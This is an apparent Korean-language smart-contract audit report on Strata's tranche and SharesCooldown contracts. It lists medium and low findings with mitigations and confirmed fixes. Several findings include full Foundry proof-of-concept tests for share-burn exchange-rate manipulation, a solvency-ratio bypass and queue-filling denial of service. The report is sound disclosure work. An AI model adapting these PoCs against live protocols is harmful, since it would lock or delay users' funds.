**Lead Auditors**

[0xStalin](https://x.com/0xStalin)

[BengalCatBalu](https://x.com/BengalCatBalu)

**Assisting Auditors**



---

# 발견 사항 (Findings)
## 중간 위험 (Medium Risk)


### `SharesCooldown`에서 출금 요청을 finalize할 때 제3자가 사용자가 고른 출력 토큰을 덮어쓸 수 있음

**설명:** `Tranche::withdraw/redeem` 중 사용자는 원하는 출력 토큰을 선택할 수 있습니다. 하지만 exit mode가 `SharesLock`일 때는 사용자가 최종적으로 받는 토큰이 더 이상 사용자 통제 하에 있지 않습니다.

- `SharesCooldown`의 finalization은 permissionless이므로, 어떤 호출자든 finalization 시점에 출력 토큰을 선택할 수 있습니다. 그 결과 제3자가 사용자가 원래 의도한 것과 다른 토큰으로 출금 청구를 finalize할 수 있습니다.
```solidity
    function finalize(ITranche vault, address token, address user) external returns (uint256 claimed) {
        return finalize(vault, token, user, block.timestamp);
    }
    function finalize(ITranche vault, address token, address user, uint256 at) public returns (uint256 claimed) {
        claimed = extractClaimableInner(address(vault), user, at);
        vault.redeem(token, claimed, user, address(this));
        emit Finalized(vault, user, claimed);
        return claimed;
    }
```

이 문제는 사용자가 자산을 최종적으로 받기까지 걸리는 시간이, 사용자가 감수할 수 있는 수준보다 더 길어질 수 있다는 점에서 중요합니다. 예를 들어 사용자가 `sUSDe`를 `outputToken`으로 선택한 상황을 보겠습니다. 이런 출금 요청을 `SharesCooldown`에서 finalize하면 다음과 같습니다.
1. finalization이 `sUSDe`를 선택하면, 사용자가 기다려야 하는 시간은 `cooldown` 기간뿐입니다.
2. 반대로 finalization이 `USDe`를 선택하면, 사용자는 `cooldown` 기간에 더해 `sUSDe` 컨트랙트의 `unstaking` 기간까지 기다려야 하고, 그 기간이 끝난 뒤에야 자산을 돌려받게 됩니다.


**권장 완화 조치:** cooldown 요청 생성 시 사용자가 선택한 출력 토큰을 저장하고, permissionless finalization에서도 이를 강제하십시오.

**Strata:** 커밋 [0354983](https://github.com/Strata-Money/contracts-tranches/commit/03549831cf5912b15d9a0eac2bdcfae7e1c395d8)에서 수정됨.

**Cyfrin:** 확인함. 이제 permissionless finalization은 사용자의 원래 선택을 덮어쓸 수 없고, 사용자가 permissioned 함수로만 redeemable token을 변경할 수 있습니다. 또한 이제는 특정 토큰에 대한 요청만 선택적으로 finalize하는 것도 가능합니다.


### `Tranche::burnSharesAsFee`로 환율을 조작해 정상 사용자의 출금을 revert시킬 수 있음

**설명:** `Tranche::burnSharesAsFee`는 share를 소각하고, 그 share에 대응하는 NAV를 Tranche와 Reserve에 분배하는 방식으로 수수료를 부과하기 위해 새로 추가된 함수입니다.

문제는 이 함수가 첫 정상 예치 전에 환율을 인위적으로 부풀리는 데 악용될 수 있다는 점입니다.
이 경우 시스템은 `Tranche_NAV > 0`인데 `totalSupply == 0`인 예상 밖 상태에 놓이게 되고, 공격자는 1 wei의 share만 민팅해도 환율을 극단적으로 부풀릴 수 있습니다.

**영향:** 자산이 Strategy 컨트랙트에 묶이게 됩니다.

**개념 증명 (Proof of Concept):** 다음 공격은 `Tranche::burnSharesAsFee`를 통해 환율을 조작하는 방식을 보여줍니다.
1. 공격자가 정상 사용자의 예치를 프런트런해 Tranche에 1 full share를 민팅합니다.
2. 공격자가 `Tranche::burnSharesAsFee`를 호출해 그 full share를 소각합니다.
- 이 시점에서 `totalSupply`는 0이 되지만, `retentionBps` 때문에 `Tranche_NAV`는 0보다 큽니다.
3. 공격자가 1 wei의 share를 민팅합니다.
- 이때 환율은 "현재 전체 TrancheNav에 대해 1 wei share"로 설정됩니다.
5. 그 후 첫 정상 예치가 처리되면, 정상 사용자는 `MIN_SHARES`보다 훨씬 적은 극소량의 share만 받게 됩니다.
6. 정상 사용자가 출금을 시도하면, tranche의 총 shares가 `MIN_SHARES`보다 낮기 때문에 revert됩니다.

다음 PoC를 `test/PoC/Cyfrin` 폴더에 추가하십시오.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IErrors } from "../../../contracts/tranches/interfaces/IErrors.sol";

contract BurnSharesAsFees_ToManipulateExchangeRate is CDOTest {
    function test_PoC_burnSharesAsFees_ToManipulateExchangeRate() public {
        // Set retentionBps at 80% for both tranches
        accounting.setFeeRetentionBps(0.8e18, 0.8e18);

        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");

        // Same value as in the Tranche contract
        uint256 MIN_SHARES = 0.1 ether;

//////// initialize sUSDe exchange rate and mint USDe to bob and alice ////////
        USDe.mint(bob, 1000 ether);
        vm.startPrank(bob);
            USDe.approve(address(sUSDe), type(uint256).max);
            sUSDe.deposit(1000 ether, bob);
        vm.stopPrank();

        uint256 initialDeposit = 1000 ether;
        USDe.mint(alice, initialDeposit);
        USDe.mint(bob, initialDeposit);
//////////////////////////////////////////////////////////////////////////////

//////// alice manipulates exchange rate on JRTranche via burning shares as feees ////////
        vm.startPrank(alice);
            USDe.approve(address(jrtVault), type(uint256).max);
            jrtVault.deposit(1e18, alice);

            uint256 aliceMaxRedeem = jrtVault.maxRedeem(alice);
            jrtVault.burnSharesAsFee(aliceMaxRedeem, alice);

            assertEq(jrtVault.totalSupply(), 0);
            assertGt(jrtVault.totalAssets(), 0);

            jrtVault.mint(1, alice);
            assertEq(jrtVault.totalSupply(), 1);

            uint256 exchangeRate = jrtVault.convertToAssets(1);
            assertGt(exchangeRate, 0.5e18);
        vm.stopPrank();
//////////////////////////////////////////////////////////////////////////////

//////// bob deposits and loses his assets because of the manipulated exchange rate ////////
        USDe.mint(bob, 1_000_000e18);
        vm.startPrank(bob);
            USDe.approve(address(jrtVault), type(uint256).max);
            //Step 2 => Now Bob deposits 1million USDe into the Tranche
            jrtVault.deposit(1_000_000e18, bob);

            //Because of the manipulated exchange rate, the total minted TrancheShares for such a big deposits won't even reach the MIN_SHARES
            assertLt(jrtVault.totalSupply(), MIN_SHARES);

            //Step 3 => Bob attempts to make a withdrawal, but the withdrawal reverts because the total shares on the Tranche fall below MIN_SHARES
            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(10_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(100e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(90_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(1e18, bob, bob);
        vm.stopPrank();
    }
//////////////////////////////////////////////////////////////////////////////
}
```

**권장 완화 조치:** 수수료 목적으로 share를 소각할 때, 남아 있는 shares가 `MIN_SHARES` 이상인지 검증하는 방안을 고려하십시오.
- `Tranche::burnSharesAsFee` 실행 끝에서 `_onAfterWithdrawalChecks`를 호출하십시오.

**Strata:** 커밋 [ad26a5e](https://github.com/Strata-Money/contracts-tranches/commit/ad26a5eeb865bf01caf564484d4ff222ee8d7228)에서 수정됨

**Cyfrin:** 확인함. 이제 `Tranche::_onAfterWithdrawalChecks`가 호출되어 `MIN_SHARES` 아래로 소각되는 것을 막습니다.


### JR Tranche는 `SharesCooldown` finalization이 `minimumJrtSrtRatio`를 우회할 수 있어서 bankrun 시나리오에 취약하며, 먼저 출금하는 JR 사용자가 늦게 출금하는 사용자보다 더 유리한 cooldown과 fee를 받음

**설명:** 프로토콜은 `minimumJrtSrtRatio`를 통해 강한 지급여력 제약을 둡니다. 이는 Junior Tranche(JRT)가 Senior Tranche(SRT) 대비 항상 최소한의 완충 자산을 유지하도록 하기 위한 것입니다. 이 불변식은 일반 출금 시 `Accounting.maxWithdrawInner()`에서 강제됩니다. 하지만 share 소유자가 `SharesCooldown` 컨트랙트일 때(즉 `finalize` 함수에서 호출될 때)는 이 보호가 명시적으로 비활성화됩니다.

```solidity
    function maxWithdrawInner(bool isJrt, bool ownerIsSharesCooldown) internal view returns (uint256) {
        if (ownerIsSharesCooldown) {
            return isJrt ? jrtNav : srtNav;
        }
        if (isJrt) {
            uint256 minJrt = srtNav * minimumJrtSrtRatio / 1e18;
            return Math.saturatingSub(jrtNav, minJrt);
        }
        // srt
        return srtNav;
    }
```

이는 치명적인 우회를 만듭니다. JRT shares가 `SharesCooldown`으로 이동하면, 이후 redemption은 `owner = SharesCooldown`으로 실행됩니다. 그 순간 JRT hard-floor가 더 이상 적용되지 않으며, 프로토콜은 `minimumJrtSrtRatio`를 위반하더라도 JRT NAV 전체까지 인출을 허용하게 됩니다.

첨부된 PoC는 이 동작을 보여줍니다. JRT share가 잠긴 뒤 추가 `SRT` 예치가 `srtNav`를 증가시키고, 이후 `SharesCooldown.finalize()`가 호출되면 JRT 출금은 어떤 hard-floor 강제도 없이 실행되어 시스템은 `minimumJrtSrtRatio` 아래로 내려갑니다.

`SharesCooldown`을 통한 hard-floor 우회는, 현재 `coverage`에 기반해 출금 cooldown과 fee를 정하는 메커니즘과 결합될 경우 시스템을 bankrun 시나리오에 취약하게 만듭니다. JR 예치자들은 ratio가 계속 hard-floor로 내려갈 가능성에 대비해 선제적으로 출금 요청을 몰리게 되고, 먼저 출금하는 이들은:
- hard-floor에 도달하기 전에 자금을 회수할 수 있게 됩니다.
- 시스템이 다시 회복되면 출금 요청을 취소하고 계속 수익을 얻을 수도 있습니다.
- 이 과정은 늦게 출금하는 사용자에게 불공정합니다. JR 출금이 더 많이 처리될수록 `coverage`가 증가하고, 늦게 출금하는 사람들은 더 긴 cooldown과 더 높은 fee를 부담하게 되기 때문입니다.
- 결과적으로 시스템은 `coverage`가 높을 때 JR tranche에서 먼저 빠져나가는 사람들에게 낮은 fee와 짧은 cooldown을 제공하는 유인을 만들게 됩니다.


**영향:** 모든 `finalize` 함수는 `SharesCooldown`에서 shares를 redeem할 때 `minimumJrtSrtRatio` 제약을 우회할 수 있습니다. 특히 `finalizeWithFee()`가 가장 위험한 벡터인데, 사용자가 coverage가 좋은 시점에 shares를 잠가 두었다가 fee만 내고 일찍 빠져나가며 hard floor를 우회할 수 있기 때문입니다. 이로써 `minimumJrtSrtRatio`는 지급여력 보호 장치가 아니라, 돈을 내고 우회하는 메커니즘으로 바뀝니다.

`jrtNav / srtNav`가 `minimumJrtSrtRatio`보다 낮아지면:

1. `minimumJrtSrtRatioBuffer` 때문에 SRT 예치가 비활성화됩니다.

2. 일반 JRT 출금이 막혀, 남아 있는 JRT 유동성이 사실상 갇히게 됩니다.

3. 늦게 출금하는 JRT 사용자는 더 높은 fee와 더 긴 cooldown을 부담하게 됩니다.

**개념 증명 (Proof of Concept):** `test/PoC/Cyfrin`에 새 파일을 만드십시오.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console} from "forge-std/console.sol";
import {SharesCooldown} from "../../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {AccessControlled} from "../../../contracts/governance/AccessControlled.sol";
import {ISharesCooldown} from "../../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { CooldownBase } from "../../../contracts/tranches/base/cooldown/CooldownBase.sol";

contract JrtSrtRatioViolationTest is CDOTest {

    function test_PoC() public {
        address victim = address(0x1234);
        address attacker = address(0x5678);
        address owner = cdo.owner();
        vm.startPrank(owner);
        SharesCooldown sharesCooldown = SharesCooldown(
            address(
                new ERC1967Proxy(
                    address(new SharesCooldown()),
                    abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
                )
            )
        );
        AccessControlled(sharesCooldown).setTwoStepConfigManager(owner);
        SharesCooldown.TExitUpperBounds memory exitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 100000,                    // 10% (in ppm)
            p1: 150000,                   // 2.3% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 1000, sharesLock: 7 days }),   // Most restrictive: 0.1% fee, 7d lock
            r1: ISharesCooldown.TExitParams({ feePpm: 500, sharesLock: 1 days }),    // Median: 0.05% fee, 1d lock
            r2: ISharesCooldown.TExitParams({ feePpm: 0, sharesLock: 0 })            // Least: 0 fee, no lock
        });
        sharesCooldown.setVaultExitBounds(address(jrtVault), exitBounds);
        acm.grantRole(keccak256("COOLDOWN_WORKER_ROLE"), address(cdo));
        // 2. Register sharesCooldown in CDO
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown)));

        uint256 victimJRTDeposit = 100 ether;
        uint256 attackerSRTDeposit = 1100 ether; // will push jrtNav:srtNav close to 0.05 minimumJrtSrtRatio

        // Victim deposits to JRT
        vm.startPrank(victim);
        USDe.mint(victim, victimJRTDeposit);
        USDe.approve(address(jrtVault), victimJRTDeposit);
        jrtVault.deposit(victimJRTDeposit, victim);
        vm.stopPrank();

        // Attacker deposits to SRT
        vm.startPrank(attacker);
        USDe.mint(attacker, attackerSRTDeposit);
        USDe.approve(address(srtVault), attackerSRTDeposit);
        srtVault.deposit(attackerSRTDeposit, attacker);
        vm.stopPrank();

        // Sanity: Get initial jrtNav and srtNav
        (uint256 jrtNavT0, uint256 srtNavT0, ) = accounting.totalAssetsT0();
        // Confirm we’re at the hard floor (i.e. jrtNav/srtNav ≈ minimumJrtSrtRatio)
        uint256 ratio = (jrtNavT0 * 1e18) / srtNavT0;
        console.log("Ratio: ", ratio);

        // victim withdraws 40 shares from JRT
        vm.startPrank(victim);
        uint256 victimWithdrawAmount = 40 ether;
        jrtVault.withdraw(victimWithdrawAmount, victim, victim);
        vm.stopPrank();

        // Current ratio is still 100/1100 since TVL doesnt decrease

        // Attacker deposits additional 900 ether to SRT vault
        uint256 additionalSRTDeposit = 565 ether;
        vm.startPrank(attacker);
        USDe.mint(attacker, additionalSRTDeposit);
        USDe.approve(address(srtVault), additionalSRTDeposit);
        srtVault.deposit(additionalSRTDeposit, attacker);
        vm.stopPrank();

        vm.warp(block.timestamp + 8 days);

        vm.startPrank(victim);
        sharesCooldown.finalize(jrtVault, address(USDe), victim);
        vm.stopPrank();

        (jrtNavT0, srtNavT0, ) = accounting.totalAssetsT0();
        ratio = (jrtNavT0 * 1e18) / srtNavT0;
        console.log("Ratio after JRT withdrawal finalized: ", ratio);
        assertLt(ratio, 0.05e18, "Ratio is not below minimum required 5%");
    }
}
```

**권장 완화 조치:** `finalizeWithFee()`를 수정해 조기 종료 시에도 `minimumJrtSrtRatio` 제약이 적용되도록 하십시오. 사용자가 fee를 내고 hard floor를 우회하지 못하게 해야 합니다.

또한 시스템 메커니즘을 바꿔, 가능하면 JRT에서의 출금을 억제하고 예치자가 자금을 유지하도록 유도하는 것도 고려하십시오. 예를 들면:
- `coverage`가 높을 때는 더 긴 cooldown과 더 높은 fee
- `coverage`가 낮을 때는 더 짧은 cooldown과 더 낮은 fee
즉 먼저 출금하는 사용자를 억제해, 늦게 출금하는 사용자가 SR 예치를 떠받치는 더 큰 리스크를 지는 구조를 완화해야 합니다.


**Strata:** 커밋 [1feb125](https://github.com/Strata-Money/contracts-tranches/commit/1feb125bd8028d9d8ae2a0034f5cf831c82649e6)에서 수정됨.

**Cyfrin:** 확인함. 즉시 finalization은 redeem하려는 shares가 기초 Tranche에서 최대 redeem 가능한 shares를 초과하면 revert합니다. 그리고 이 최대 redeem 가능 shares 계산에는 JRT의 `minimumJrtSrtRatio`가 반영됩니다.


### `UnstakeCooldown` 요청 한도 때문에 `SharesCooldown` 즉시 finalization이 DoS될 수 있음

**설명:** `finalizeWithFee`를 통한 `SharesCooldown` 포지션의 즉시 finalization은 사용자가 `USDe`를 받도록 강제합니다.
실행 흐름은 결국 `strategy.withdraw`로 이어지며, 여기서 `sender = SharesCooldown`, `receiver = user`가 됩니다. 이때 `token`이 `USDe`이므로, 다음과 같은 `UnstakeCooldown` 요청이 생성됩니다.

```solidity
unstakeCooldown.transfer(sUSDe, sender, receiver, shares);
```

`UnstakeCooldown.transfer` 내부에서는 제3자 주도 transfer에 대해 엄격한 한도를 강제합니다.

```solidity
if (initialFrom != to && requestsCount >= PUBLIC_REQUEST_SLOTS_CAP) {
    revert ExternalReceiverRequestLimitReached(...)
}
```

`initialFrom = SharesCooldown`, `to = user`이므로, `SharesCooldown`을 통한 모든 `USDe` finalization은 사용자의 `UnstakeCooldown` 큐에서 `PUBLIC_REQUEST_SLOTS_CAP`(40) 슬롯 중 하나를 소모합니다.

하지만 `SharesCooldown` 자체는 사용자당 최대 70개의 활성 요청을 허용합니다. 이 불일치 때문에, 최대 30개의 정상적인 `SharesCooldown` 요청이 `USDe`로는 finalization되지 못하고 `unstakeCooldown.transfer`에서 40 슬롯 한도에 걸려 revert될 수 있습니다.

이는 악용 가능합니다. 공격자는 블록당 하나씩 작은 `SharesCooldown` 출금 요청을 최대 40개까지 만들고, 이 요청들이 claimable해질 때까지 기다린 뒤 이를 `USDe`로 finalize하려고 시도할 수 있습니다. 그러면 피해자의 `UnstakeCooldown` 큐가 꽉 차게 됩니다. `sUSDe`의 unstake 지연 시간(예: 8시간) 동안, 이 기간에 발생하는 모든 즉시 finalization(`finalizeWithFee`)은 자산이 자동으로 `USDe`로 선택되기 때문에 revert하게 됩니다.

**영향:** `finalizeWithFee`를 통한 즉시 finalization은 이런 DoS에 취약하며, 그 결과 사용자는 `UnstakeCooldown` 큐에 쌓인 출금 요청의 unstake 지연이 끝날 때까지 기다려야 합니다.

**개념 증명 (Proof of Concept):** `PoC/cyfrin`에 새 파일을 붙여 넣으십시오.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console} from "forge-std/console.sol";
import {SharesCooldown} from "../../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {AccessControlled} from "../../../contracts/governance/AccessControlled.sol";
import {ISharesCooldown} from "../../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { CooldownBase } from "../../../contracts/tranches/base/cooldown/CooldownBase.sol";

contract JrtSrtRatioViolationTest is CDOTest {

    function test_PoC_DoS() public {
        address victim = address(0x1234);
        address attacker = address(0x5678);
        address owner = cdo.owner();
        vm.startPrank(owner);
        SharesCooldown sharesCooldown = SharesCooldown(
            address(
                new ERC1967Proxy(
                    address(new SharesCooldown()),
                    abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
                )
            )
        );
        AccessControlled(sharesCooldown).setTwoStepConfigManager(owner);
        acm.grantRole(keccak256("COOLDOWN_WORKER_ROLE"), address(cdo));
        // 2. Register sharesCooldown in CDO
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown)));


        // Set up real spec exit bands per reference
        SharesCooldown.TExitUpperBounds memory jrtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 100000,     // 0.5% (in ppm)
            p1: 150000,    // 2.3% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 2 days }),   // 1% fee + 2 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 5000, sharesLock: 8 hours }),   // 0.5% fee + 8h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 300, sharesLock: 0 })           // 0.03% fee, no lock
        });
        SharesCooldown.TExitUpperBounds memory srtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 20000,     // 2% (in ppm)
            p1: 400000,    // 40% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 3 days }),   // 1% fee + 3 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 7000, sharesLock: 7 hours }),   // 0.7% fee + 7h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 1500, sharesLock: 0 })          // 0.15% fee, no lock
        });
        sharesCooldown.setVaultExitBounds(address(jrtVault), jrtExitBounds);
        sharesCooldown.setVaultExitBounds(address(srtVault), srtExitBounds);

        // Victim deposits to JRT and requests withdrawal (finalizable with fee)
        uint256 victimDeposit = 1100 ether;
        vm.startPrank(victim);
        USDe.mint(victim, victimDeposit);
        USDe.approve(address(jrtVault), 100 ether);
        USDe.approve(address(srtVault), 1000 ether);
        jrtVault.deposit(100 ether, victim);
        srtVault.deposit(1000 ether, victim);
        vm.stopPrank();

        // Victim requests to withdraw 40 shares from JRT (creates withdrawal request)
        uint256 withdrawAmount = 40 ether;
        vm.startPrank(victim);
        jrtVault.withdraw(withdrawAmount, victim, victim);
        vm.stopPrank();

        skip(1 hours);
        // Attacker creates 40 minimal withdrawals on behalf of the victim, inflating activeRequests array
        vm.prank(owner);
        cdo.setSharesCooldown(ISharesCooldown(address(0))); // disable shares cooldown for example
        vm.startPrank(attacker);
        USDe.mint(attacker, 1 ether);
        USDe.approve(address(jrtVault), 1 ether);
        jrtVault.deposit(1 ether, attacker);
        uint256 attackerMinWithdrawal = 1;
        for (uint256 i = 0; i < 40; ++i) {
            skip(1);
            jrtVault.withdraw(attackerMinWithdrawal, victim, attacker);
        }
        vm.stopPrank();

        vm.startPrank(owner);
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown))); // return back
        sharesCooldown.setVaultEarlyExitFee(address(jrtVault), 0.001 ether);
        vm.stopPrank();

        vm.startPrank(victim);
        vm.expectRevert();
        sharesCooldown.finalizeWithFee(jrtVault, victim, 0);
        vm.stopPrank();
    }
}
```

**권장 완화 조치:** `finalizeWithFee`가 사용자가 받을 자산을 선택할 수 있게 해야 합니다.
- 사용자가 즉시 출금 시 받을 자산을 선택할 수 있다면, 단순히 `sUSDe`를 선택해서 이 DoS를 우회할 수 있으므로 공격 유인이 사실상 사라집니다.

**Strata:** 커밋 [ebd4376](https://github.com/Strata-Money/contracts-tranches/commit/ebd4376019936cfc080ad7a06c8fec1d2ba324a9)에서 수정됨.

**Cyfrin:** 확인함. 이제 사용자는 `SharesCooldown`에서 요청을 즉시 finalize할 때 받을 `token`을 직접 선택할 수 있습니다.


### 출금 수수료로 인한 NAV 변화가 APR Target에 반영되지 않음

**설명:** `SharesCooldown`으로 보내는 출금 요청 처리 경로는 redeem된 전체 Tranche Shares를 기준으로 수수료를 부과합니다. 이 수수료는 tranche shares를 소각하고, 그에 따라 Tranche NAV와 `reserveNav`를 갱신하는 방식으로 반영됩니다.
- `SharesCooldown::requestRedeem` => `SharesCooldown::accrueFee` => `Tranche::burnSharesAsFee` => `CDO::accrueFee` => `Accounting::accrueFee`

문제는 이 과정에서 Tranche의 APR Target이 NAV 변화에 맞춰 재계산되지 않는다는 점입니다. 따라서 APR을 갱신하는 새로운 작업이 발생하기 전까지 시스템은 오래된 APR target을 계속 사용하게 됩니다.
```solidity

//Tranche::burnSharesAsFee//
    function burnSharesAsFee(uint256 shares, address owner) external returns (uint256 assets) {
        ...
        cdo.accrueFee(address(this), assets);
    }

//CDO::accrueFee//
    function accrueFee (address tranche, uint256 assets) external onlyTranche {
        accounting.accrueFee(isJrt(tranche), assets);
    }

//Accounting::accrueFee//
    function accrueFee (bool isJrt, uint256 amount) external onlyCDO {
        ...

 //@audit-issue => navs are modified, but the APRs are not updated!

        reserveNav += amountToReserve;
        if (isJrt) {
            jrtNav -= amountToReserve;
        } else {
            srtNav -= amountToReserve;
        }
        emit FeeAccrued(isJrt, amountToReserve, amount - amountToReserve);
    }
```

**영향:** 오래된 APR target, 특히 실제보다 높게 남아 있는 SR Tranche APR target 때문에 JR은 받아야 할 이자보다 적게 받게 됩니다.

**권장 완화 조치:** `Accounting::updateBalanceFlow`와 비슷하게, `Accounting::accrueFee` 함수도 APR Target을 갱신하도록 리팩터링하는 것을 고려하십시오.

**Strata:** 커밋 [b11016c](https://github.com/Strata-Money/contracts-tranches/commit/b11016c052b9b2a89a60ed6c4502c8bd94fbbea8)에서 수정됨.

**Cyfrin:** 확인함. 이제 `Tranche::burnSharesAsFee`는 전체 accounting flow를 확장해, 필요 시 APR도 함께 갱신합니다.


### coverage 증가를 이용한 grief 공격으로 기존 출금 요청을 DoS시킬 수 있음

**설명:** 이 이슈는 **a) SR Tranche의 대규모 출금** 또는 **b) JR 예치 증가**로 인해 `coverage`가 증가할 때, 이를 악용해 원하는 시점에 DoS를 일으키고 즉시 finalization과 일반 finalization(쿨다운 종료 후) 모두에 영향을 줄 수 있음을 보여줍니다.

이슈 [*Finalizing withdrawal requests on the `SharesCooldown` contract allows for third-parties to override user’s chosen output token*](#finalizing-withdrawal-requests-on-the-sharescooldown-contract-allows-for-thirdparties-to-override-users-chosen-output-token)의 수정은 permissionless `finalize` 함수의 문제만 해결합니다. 하지만 그 수정 이후에도, `USDe`를 요청한 출금에 대해서는 이 이슈가 여전히 성립합니다. 또한 [*`SharesCooldown` instant finalization can be DoSed because of the `UnstakeCooldown` request limits*](#sharescooldown-instant-finalization-can-be-dosed-because-of-the-unstakecooldown-request-limits)의 수정은 즉시 finalization에 대해서만 문제를 해결합니다.

현재 `coverage` 기반 cooldown/fee 메커니즘은 다음 전제를 갖습니다.
- coverage가 높을수록 cooldown과 fee가 낮아짐
- coverage가 낮을수록 cooldown과 fee가 높아짐

공격자는 정당한 사용자보다 더 좋은 `coverage` 구간을 노려, SR Tranche에서 `USDe`를 요청한 출금 사용자를 괴롭힐 수 있습니다. 출금 이후 `coverage`가 더 좋은 구간으로 이동하면 이후 출금 요청들은 더 짧은 cooldown과 더 낮은 fee를 가지게 되고, 공격자는 그 차이를 이용해 `UnstakeCooldown` 큐를 채울 수 있습니다.

공격 예시는 다음과 같습니다.
1. SR Tranche에서 `USDe`를 요청하는 출금이 하나 존재합니다.
2. `coverage`가 더 덜 제한적인 구간으로 올라갑니다. 이는 a) 1번 출금 자체가 큰 출금인 경우, 혹은 b) JR Tranche 예치 증가 때문에 발생할 수 있습니다.
3. 공격자는 작은 출금들을 여러 개 요청하면서, 받을 자산으로 `USDe`를 선택하고, 1번 출금 사용자를 `receiver`로 설정합니다.
- 이 새 출금들은 step 1이 처리될 당시보다 더 좋은 `coverage` 구간을 사용하므로 더 짧은 cooldown을 갖습니다.
4. 시간이 지나 이들 요청의 cooldown이 끝나면, 공격자는 이를 finalize하여 `SharesCooldown`에서 해당 사용자의 `activeRequests` 수는 줄이고, 대신 `UnstakeCooldown` 큐를 채웁니다.
5. 첫 번째 출금 요청이 cooldown 중인 동안, 공격자는 step 3~5를 반복하며 피해자의 `UnstakeCooldown` 큐를 한계까지 채우고, 동시에 `SharesCooldown`에 더 많은 출금 요청을 냉각 상태로 만들어 둘 수 있습니다.
6. 첫 번째 출금의 cooldown이 끝나 피해자가 이를 finalize하려 하면, `UnstakeCooldown` 큐가 이미 가득 차 있어 `ExternalReceiverRequestLimitReached` 오류로 revert됩니다.

**영향:** SR 출금이 `USDe`를 요청한 경우, 일시적으로 DoS될 수 있습니다.

**권장 완화 조치:** [*`SharesCooldown` instant finalization can be DoSed because of the `UnstakeCooldown` request limits*](#sharescooldown-instant-finalization-can-be-dosed-because-of-the-unstakecooldown-request-limits)만으로는 즉시 finalization DoS만 막을 수 있습니다. 또한 [*Finalizing withdrawal requests on the `SharesCooldown` contract allows for third-parties to override user’s chosen output token*](#finalizing-withdrawal-requests-on-the-sharescooldown-contract-allows-for-thirdparties-to-override-users-chosen-output-token)의 권장 완화책도 일반 finalization에는 충분하지 않습니다. 따라서 두 문제의 수정(#15 및 해당 토큰 override 이슈)을 모두 반영하면서 모든 DoS 시나리오를 막으려면 다음 수정이 필요합니다.
- **새로운 permissioned `finalize` 함수를 만들어, 오직 출금 요청자만 호출할 수 있도록 하십시오.** 이 함수는 앞서 제안한 완화책과 달리 **출금 요청자가 받을 자산을 직접 지정할 수 있어야 합니다.** 반면 permissionless 버전은 그러지 않아야 하며, 출금 요청 시점의 원래 선택을 그대로 유지해야 합니다.

**Strata:** 커밋 [0354983](https://github.com/Strata-Money/contracts-tranches/commit/03549831cf5912b15d9a0eac2bdcfae7e1c395d8)에서 수정됨.

**Cyfrin:** 확인함. 새 함수 `SharesCooldown::finalizeWithTokenOverride`를 통해 출금 요청자가 자신이 받고 싶은 `token`을 지정하며 출금 요청을 finalize할 수 있게 되었습니다.

\clearpage
## 낮은 위험 (Low Risk)


### 잘못된 `validateRedemptionParams` 검사

**설명:** `withdraw`와 `redeem` 함수는 사용자가 제공한 출구 파라미터가 프로토콜이 계산한 exit mode와 일치하도록 강제함으로써 UX 수준의 슬리피지 보호를 제공하도록 설계되었습니다. 즉 조건이 바뀌면 트랜잭션은 revert되어야 하며, 이것이 프로토콜이 설명한 동작입니다.

하지만 현재 `validateRedemptionParams`는 사용자 파라미터가 시스템 파라미터와 다를 때 revert하지 않고 `return`합니다. 그 결과 슬리피지 보호가 사실상 완전히 무력화되며, 팀이 설명한 UX 보장도 깨집니다.

```solidity
function validateRedemptionParams(TRedemptionParams memory params, IStrataCDO.TExitMode exitMode, uint256 exitFee, uint32 cooldownSec) internal pure {
        if (params.exitMode == IStrataCDO.TExitMode.Dynamic) {
            return;
        }
        if (params.exitMode != exitMode || params.exitFee != exitFee || params.cooldownSeconds != cooldownSec) {
            return;
        }
        revert RedemptionParamsMismatch(params, TRedemptionParams({
            exitMode: exitMode,
            exitFee: exitFee,
            cooldownSeconds: cooldownSec
        }));
    }
```

